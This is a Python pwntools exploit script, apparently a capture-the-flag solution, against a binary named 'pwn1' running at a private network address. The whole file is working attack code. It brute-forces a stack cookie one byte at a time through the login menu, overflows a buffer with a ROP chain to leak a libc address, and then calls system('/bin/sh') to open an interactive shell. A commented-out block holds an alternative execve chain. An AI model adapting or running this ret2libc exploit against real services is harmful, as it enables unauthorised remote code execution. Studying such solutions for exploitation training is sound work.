from pwn import *

#p = process("./pwn1")
p = remote("192.168.30.23",20001)

def reg(name, idn):
	p.recvuntil("Your choice:")
	p.sendline("1")
	p.recvuntil("Input your name:\n")
	p.send(name)
	p.recvuntil("Input the last six numbers of your ID card:\n")
	p.send(idn)


def login(name, idn):
	p.recvuntil("Your choice:")
	p.sendline("2")
	p.recvuntil("name:\n")
	p.send(name)
	p.recvuntil("Last six numbers of your ID card:\n")
	p.send(idn)
	

def reset(cookie, idn, payload):
	p.recvuntil("Your choice:")
	p.sendline("3")
	p.recvuntil("Do you want to change your ID number?\n")
	p.sendline(payload)
	p.recvuntil("Input your cookie:\n")
	p.sendline(str(cookie))
	p.recvuntil("Your name:\n")
	p.recvuntil("Input your new ID number:\n")
	p.send(idn)

def logout():
	p.recvuntil("Your choice:")
	p.sendline("4")

name = "xxx"
idn = "2"*0x20
p.sendafter("Input your name:\n",name)
p.sendafter("Input the last six numbers of your ID card:\n",idn)
logout()


for i in range(6):
	for j in range(0,0x100):
		login(name, idn + chr(j))
		result = p.recvline()
		#print result
		logout()
		if "Hello" in result:
			idn += chr(j)
			logout()
			break

print idn
cookie = u32(idn[0x20:0x24])
print hex(cookie)
login(name,'2'*0x20)
#gdb.attach(p)
p.recvuntil("Your choice:")
p.sendline("3")
p.recvuntil("Do you want to change your ID number?\n")
p.sendline('y'*0x28 + p64(0x400de3) + p64(0x602040) + p64(0x400750) + p64(0x400C77))
p.recvuntil("Input your cookie:\n")
p.sendline(str(cookie))
p.recvuntil("Input your new ID number:\n")
p.send("xxx")
read_addr = u64(p.recv(6).ljust(8,"\x00"))
print "read: " + hex(read_addr)

system = 0x45390
sh = 0x18CD57
read = 0xF7250
libc = read_addr - read
system += libc
sh += libc


p.recvuntil("Do you want to change your ID number?\n")
p.sendline('y'*0x28 + p64(0x400de3) + p64(sh) + p64(system) + p64(0x400C77))
p.recvuntil("Input your cookie:\n")
p.sendline(str(cookie))
p.recvuntil("Input your new ID number:\n")
#gdb.attach(p)
#raw_input()
p.send("xxx")
p.interactive()


'''


read_addr = u64(p.recv(6).ljust(8,"\x00"))
#print p.recv(6)
print "read: " + hex(read_addr)
p.sendline("x")
sh = 0x18CD57
execve = 0xCC770
#0xf02a4 0xf1147
read = 0xF7250

libc = read_addr - read
execve += libc
sh += libc

p.recvuntil("Your choice:")
p.sendline("3")
p.recvuntil("Do you want to change your ID number?\n")
#gdb.attach(p)
#raw_input()
p.sendline('y'*8 + p64(0x602040) + "\x00" * 0x18 + p64(execve) + p64(sh)*2 + p64(0x0)*2)
p.recvuntil("Input your cookie:\n")
p.sendline(str(cookie))
p.recvuntil("Input your new ID number:")
gdb.attach(p)
#p.sendline("x")
#sp.sendline("ls")
p.interactive()'''